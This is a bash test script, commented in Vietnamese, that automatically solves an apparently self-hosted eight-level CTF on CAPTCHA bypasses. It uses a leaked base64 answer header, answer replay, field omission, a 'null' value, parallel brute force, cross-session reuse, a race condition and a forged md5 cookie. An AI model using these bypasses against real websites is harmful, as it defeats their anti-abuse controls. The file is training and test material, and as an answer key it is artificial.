#!/usr/bin/env bash
# ⚠️ SPOILER: lời giải tự động cho cả 8 level CTF.
# Server phải chạy với CTF_TEST=1 (ảnh kèm header X-Test-Answer để script "đọc" ảnh thay người).
# Dùng: ./tests/ctf_test.sh [base_url]
set -uo pipefail
B=${1:-http://localhost:8080}
PASS=0; FAIL=0
T=$(mktemp -d); trap 'rm -rf $T' EXIT
ok()   { echo "  ✅ level $1: $2"; PASS=$((PASS+1)); }
bad()  { echo "  ❌ level $1: $2"; FAIL=$((FAIL+1)); }
flag() { grep -o 'FLAG{[^}]*}' "$1" | head -1; }
PAYLOAD='payload={"userClass":"C","bookingDate":"18/11/2026","bookingTime":"09:00-10:00"}'
# act <level> <jar|none> <captcha|-> <outfile>
act() {
  local args=(-s -o "$4" -F actionCode=1600 -F "$PAYLOAD")
  [ "$3" != "-" ] && args+=(-F "j_captcha_response=$3")
  [ "$2" != "none" ] && args+=(-b "$2" -c "$2")
  curl "${args[@]}" "$B/ctf/$1/actions"
}
# cap <level> <jar> -> in ra header X-Test-Answer
cap() { curl -s -b "$2" -c "$2" -D - -o /dev/null "$B/ctf/$1/captcha" | tr -d '\r' | awk -F': ' 'tolower($1)=="x-test-answer"{print $2}'; }
submit_flag() { curl -s -b "$2" -c "$2" --data-urlencode "flag=$1" "$B/ctf/flag" | grep -c '"ok":true'; }

echo "== Level 1: đáp án lộ trong header X-Captcha-Token (base64)"
J=$T/j1
for i in 1 2 3 4 5; do
  TOKEN=$(curl -s -b $J -c $J -D - -o /dev/null "$B/ctf/1/captcha" | tr -d '\r' | awk -F': ' 'tolower($1)=="x-captcha-token"{print $2}')
  act 1 $J "$(echo "$TOKEN" | base64 -d)" $T/o1
done
F=$(flag $T/o1); [ -n "$F" ] && [ "$(submit_flag "$F" $J)" = 1 ] && ok 1 "$F" || bad 1 "$(cat $T/o1)"

echo "== Level 2: không xóa đáp án sau khi đúng -> replay"
J=$T/j2; A=$(cap 2 $J)
for i in 1 2 3 4 5; do act 2 $J "$A" $T/o2; done
F=$(flag $T/o2); [ -n "$F" ] && ok 2 "$F" || bad 2 "$(cat $T/o2)"

echo "== Level 3: bỏ hẳn field j_captcha_response"
act 3 none - $T/o3
F=$(flag $T/o3); [ -n "$F" ] && ok 3 "$F" || bad 3 "$(cat $T/o3)"

echo "== Level 4: gửi chuỗi \"null\" khi session chưa có captcha"
act 4 none null $T/o4
F=$(flag $T/o4); [ -n "$F" ] && ok 4 "$F" || bad 4 "$(cat $T/o4)"

echo "== Level 5: brute-force 000..999"
J=$T/j5; curl -s -b $J -c $J -o /dev/null "$B/ctf/5/captcha"
SID=$(awk '$6=="JSESSIONID"{print $7}' $J)
seq -w 0 999 | xargs -P 16 -I{} sh -c "curl -s -b 'JSESSIONID=$SID' -F actionCode=1600 -F 'j_captcha_response={}' '$B/ctf/5/actions' | grep -o 'FLAG{[^}]*}'" > $T/o5
F=$(head -1 $T/o5); [ -n "$F" ] && ok 5 "$F" || bad 5 "không đoán trúng"

echo "== Level 6: đáp án dùng chung -> lấy ảnh ở session A, gửi không kèm cookie"
A=$(cap 6 $T/j6a)
act 6 none "$A" $T/o6
F=$(flag $T/o6); [ -n "$F" ] && ok 6 "$F" || bad 6 "$(cat $T/o6)"

echo "== Level 7: race condition -> 6 request song song với cùng 1 đáp án"
J=$T/j7; A=$(cap 7 $J)
for i in 1 2 3 4 5 6; do act 7 $J "$A" $T/o7_$i & done; wait
F=$(cat $T/o7_* | grep -o 'FLAG{[^}]*}' | head -1); [ -n "$F" ] && ok 7 "$F" || bad 7 "$(cat $T/o7_*)"

echo "== Level 8: tự tạo cookie captcha_hash = md5(câu trả lời)"
H=$(printf 'abc' | md5sum | cut -d' ' -f1)
curl -s -o $T/o8 -b "captcha_hash=$H" -F actionCode=1600 -F j_captcha_response=abc "$B/ctf/8/actions"
F=$(flag $T/o8); [ -n "$F" ] && ok 8 "$F" || bad 8 "$(cat $T/o8)"

echo "== Kiểm chứng: cách chơi \"bình thường\" KHÔNG ra flag"
J=$T/jn; A=$(cap 3 $J); act 3 $J "$A" $T/on
grep -q FLAG $T/on && bad 3 "giải đúng captcha bình thường mà vẫn ra flag" || { echo "  ✅ level 3: giải captcha đúng cách -> không có flag"; PASS=$((PASS+1)); }
J=$T/jm; A=$(cap 2 $J); act 2 $J "$A" $T/om; A=$(cap 2 $J); act 2 $J "$A" $T/om
grep -q FLAG $T/om && bad 2 "lấy ảnh mỗi lần mà vẫn ra flag" || { echo "  ✅ level 2: lấy ảnh mỗi lần -> không có flag"; PASS=$((PASS+1)); }

echo; echo "Kết quả: $PASS pass, $FAIL fail"
[ $FAIL -eq 0 ]
